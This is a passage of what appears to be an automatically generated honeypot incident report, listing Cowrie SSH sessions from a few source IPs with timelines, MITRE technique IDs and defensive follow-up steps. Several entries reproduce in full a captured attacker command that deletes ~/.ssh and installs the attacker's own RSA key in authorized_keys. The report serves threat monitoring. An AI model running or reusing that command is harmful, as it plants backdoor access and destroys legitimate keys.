| **Last Seen** | 2026-06-07 14:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:11:23` | `cowrie.session.connect` |
| `2026-06-07 14:11:23` | `cowrie.client.version` |
| `2026-06-07 14:11:23` | `cowrie.client.kex` |
| `2026-06-07 14:11:23` | `cowrie.login.success` |
| `2026-06-07 14:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2828f9e8ec06

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:13 |
| **Last Seen** | 2026-06-07 14:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:13:10` | `cowrie.session.connect` |
| `2026-06-07 14:13:10` | `cowrie.client.version` |
| `2026-06-07 14:13:10` | `cowrie.client.kex` |
| `2026-06-07 14:13:10` | `cowrie.login.success` |
| `2026-06-07 14:13:10` | `cowrie.session.params` |
| `2026-06-07 14:13:10` | `cowrie.command.input` |
| `2026-06-07 14:13:10` | `cowrie.command.failed` |
| `2026-06-07 14:13:10` | `cowrie.log.closed` |
| `2026-06-07 14:13:10` | `cowrie.session.params` |
| `2026-06-07 14:13:10` | `cowrie.command.input` |
| `2026-06-07 14:13:10` | `cowrie.session.file_download` |
| `2026-06-07 14:13:10` | `cowrie.log.closed` |
| `2026-06-07 14:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a67af29084b

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:13 |
| **Last Seen** | 2026-06-07 14:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:13:11` | `cowrie.session.connect` |
| `2026-06-07 14:13:11` | `cowrie.client.version` |
| `2026-06-07 14:13:11` | `cowrie.client.kex` |
| `2026-06-07 14:13:11` | `cowrie.login.success` |
| `2026-06-07 14:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107602ed3fb1

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:19 |
| **Last Seen** | 2026-06-07 14:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:19:22` | `cowrie.session.connect` |
| `2026-06-07 14:19:22` | `cowrie.client.version` |
| `2026-06-07 14:19:22` | `cowrie.client.kex` |
| `2026-06-07 14:19:23` | `cowrie.login.success` |
| `2026-06-07 14:19:24` | `cowrie.session.params` |
| `2026-06-07 14:19:24` | `cowrie.command.input` |
| `2026-06-07 14:19:24` | `cowrie.command.failed` |
| `2026-06-07 14:19:24` | `cowrie.log.closed` |
| `2026-06-07 14:19:24` | `cowrie.session.params` |
| `2026-06-07 14:19:24` | `cowrie.command.input` |
| `2026-06-07 14:19:25` | `cowrie.session.file_download` |
| `2026-06-07 14:19:25` | `cowrie.log.closed` |
| `2026-06-07 14:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb1eebc026f3

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:19 |
| **Last Seen** | 2026-06-07 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:19:28` | `cowrie.session.connect` |
| `2026-06-07 14:19:28` | `cowrie.client.version` |
| `2026-06-07 14:19:28` | `cowrie.client.kex` |
| `2026-06-07 14:19:29` | `cowrie.login.success` |
| `2026-06-07 14:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbfdff799719

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:19 |
| **Last Seen** | 2026-06-07 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:19:36` | `cowrie.session.connect` |
| `2026-06-07 14:19:36` | `cowrie.client.version` |
| `2026-06-07 14:19:36` | `cowrie.client.kex` |
| `2026-06-07 14:19:36` | `cowrie.login.success` |
| `2026-06-07 14:19:36` | `cowrie.session.params` |
| `2026-06-07 14:19:36` | `cowrie.command.input` |
| `2026-06-07 14:19:36` | `cowrie.command.failed` |
| `2026-06-07 14:19:36` | `cowrie.log.closed` |
| `2026-06-07 14:19:36` | `cowrie.session.params` |
| `2026-06-07 14:19:36` | `cowrie.command.input` |
| `2026-06-07 14:19:36` | `cowrie.session.file_download` |
| `2026-06-07 14:19:36` | `cowrie.log.closed` |
| `2026-06-07 14:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-165e7f0a75e9

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:19 |
| **Last Seen** | 2026-06-07 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:19:37` | `cowrie.session.connect` |
| `2026-06-07 14:19:37` | `cowrie.client.version` |
| `2026-06-07 14:19:37` | `cowrie.client.kex` |
| `2026-06-07 14:19:37` | `cowrie.login.success` |
| `2026-06-07 14:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c21463a45a

| Field | Detail |
|---|---|
| **Source IP** | `217.154.180[.]67` |
| **First Seen** | 2026-06-07 14:21 |
| **Last Seen** | 2026-06-07 14:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:21:32` | `cowrie.session.connect` |
| `2026-06-07 14:21:32` | `cowrie.client.version` |
| `2026-06-07 14:21:32` | `cowrie.client.kex` |
| `2026-06-07 14:21:33` | `cowrie.login.success` |
| `2026-06-07 14:21:33` | `cowrie.session.params` |
| `2026-06-07 14:21:33` | `cowrie.command.input` |
| `2026-06-07 14:21:33` | `cowrie.command.failed` |
| `2026-06-07 14:21:34` | `cowrie.log.closed` |
| `2026-06-07 14:21:34` | `cowrie.session.params` |
| `2026-06-07 14:21:34` | `cowrie.command.input` |
| `2026-06-07 14:21:34` | `cowrie.session.file_download` |
| `2026-06-07 14:21:34` | `cowrie.log.closed` |
| `2026-06-07 14:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.180[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.154.180[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64660df99298

| Field | Detail |
|---|---|
| **Source IP** | `217.154.180[.]67` |
| **First Seen** | 2026-06-07 14:21 |
| **Last Seen** | 2026-06-07 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:21:39` | `cowrie.session.connect` |
| `2026-06-07 14:21:39` | `cowrie.client.version` |
| `2026-06-07 14:21:39` | `cowrie.client.kex` |
| `2026-06-07 14:21:40` | `cowrie.login.success` |
| `2026-06-07 14:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.180[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.154.180[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a47966c929a

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:23 |
| **Last Seen** | 2026-06-07 14:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:23:08` | `cowrie.session.connect` |
| `2026-06-07 14:23:08` | `cowrie.client.version` |
| `2026-06-07 14:23:08` | `cowrie.client.kex` |
| `2026-06-07 14:23:09` | `cowrie.login.success` |
| `2026-06-07 14:23:09` | `cowrie.session.params` |
| `2026-06-07 14:23:09` | `cowrie.command.input` |
| `2026-06-07 14:23:09` | `cowrie.command.failed` |
| `2026-06-07 14:23:10` | `cowrie.log.closed` |
| `2026-06-07 14:23:10` | `cowrie.session.params` |
| `2026-06-07 14:23:10` | `cowrie.command.input` |
| `2026-06-07 14:23:10` | `cowrie.session.file_download` |
| `2026-06-07 14:23:10` | `cowrie.log.closed` |
| `2026-06-07 14:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e734cae58d82

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:23 |
| **Last Seen** | 2026-06-07 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:23:13` | `cowrie.session.connect` |
| `2026-06-07 14:23:13` | `cowrie.client.version` |
| `2026-06-07 14:23:14` | `cowrie.client.kex` |
| `2026-06-07 14:23:15` | `cowrie.login.success` |
| `2026-06-07 14:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204c237ef762

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:24 |
| **Last Seen** | 2026-06-07 14:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:24:58` | `cowrie.session.connect` |
| `2026-06-07 14:24:58` | `cowrie.client.version` |
| `2026-06-07 14:24:58` | `cowrie.client.kex` |
| `2026-06-07 14:24:59` | `cowrie.login.success` |
| `2026-06-07 14:25:00` | `cowrie.session.params` |
| `2026-06-07 14:25:00` | `cowrie.command.input` |
| `2026-06-07 14:25:00` | `cowrie.command.failed` |
| `2026-06-07 14:25:00` | `cowrie.log.closed` |
| `2026-06-07 14:25:00` | `cowrie.session.params` |
| `2026-06-07 14:25:00` | `cowrie.command.input` |
| `2026-06-07 14:25:01` | `cowrie.session.file_download` |
| `2026-06-07 14:25:01` | `cowrie.log.closed` |
| `2026-06-07 14:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98cc170596b3

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:25 |
| **Last Seen** | 2026-06-07 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:25:04` | `cowrie.session.connect` |
| `2026-06-07 14:25:04` | `cowrie.client.version` |
| `2026-06-07 14:25:04` | `cowrie.client.kex` |
| `2026-06-07 14:25:05` | `cowrie.login.success` |
| `2026-06-07 14:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82425ec8821

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:26 |
| **Last Seen** | 2026-06-07 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:26:05` | `cowrie.session.connect` |
| `2026-06-07 14:26:05` | `cowrie.client.version` |
| `2026-06-07 14:26:05` | `cowrie.client.kex` |
| `2026-06-07 14:26:05` | `cowrie.login.success` |
| `2026-06-07 14:26:05` | `cowrie.session.params` |
| `2026-06-07 14:26:05` | `cowrie.command.input` |
| `2026-06-07 14:26:05` | `cowrie.command.failed` |
| `2026-06-07 14:26:05` | `cowrie.log.closed` |
| `2026-06-07 14:26:05` | `cowrie.session.params` |
| `2026-06-07 14:26:05` | `cowrie.command.input` |
| `2026-06-07 14:26:05` | `cowrie.session.file_download` |
| `2026-06-07 14:26:05` | `cowrie.log.closed` |
| `2026-06-07 14:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d052abe13f

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:26 |
| **Last Seen** | 2026-06-07 14:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:26:06` | `cowrie.session.connect` |
| `2026-06-07 14:26:06` | `cowrie.client.version` |
| `2026-06-07 14:26:06` | `cowrie.client.kex` |
| `2026-06-07 14:26:06` | `cowrie.login.success` |
| `2026-06-07 14:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15830e0bd32c

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:26 |
| **Last Seen** | 2026-06-07 14:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:26:53` | `cowrie.session.connect` |
| `2026-06-07 14:26:53` | `cowrie.client.version` |
| `2026-06-07 14:26:53` | `cowrie.client.kex` |
| `2026-06-07 14:26:54` | `cowrie.login.success` |
| `2026-06-07 14:26:55` | `cowrie.session.params` |
| `2026-06-07 14:26:55` | `cowrie.command.input` |
| `2026-06-07 14:26:55` | `cowrie.command.failed` |
| `2026-06-07 14:26:55` | `cowrie.log.closed` |
| `2026-06-07 14:26:55` | `cowrie.session.params` |
| `2026-06-07 14:26:55` | `cowrie.command.input` |
| `2026-06-07 14:26:56` | `cowrie.session.file_download` |
| `2026-06-07 14:26:56` | `cowrie.log.closed` |
| `2026-06-07 14:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c6900c7911f

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:26 |
| **Last Seen** | 2026-06-07 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:26:59` | `cowrie.session.connect` |
| `2026-06-07 14:26:59` | `cowrie.client.version` |
| `2026-06-07 14:26:59` | `cowrie.client.kex` |
| `2026-06-07 14:27:00` | `cowrie.login.success` |
| `2026-06-07 14:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-773adb394fb6

| Field | Detail |
|---|---|
| **Source IP** | `217.154.180[.]67` |
| **First Seen** | 2026-06-07 14:28 |
| **Last Seen** | 2026-06-07 14:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
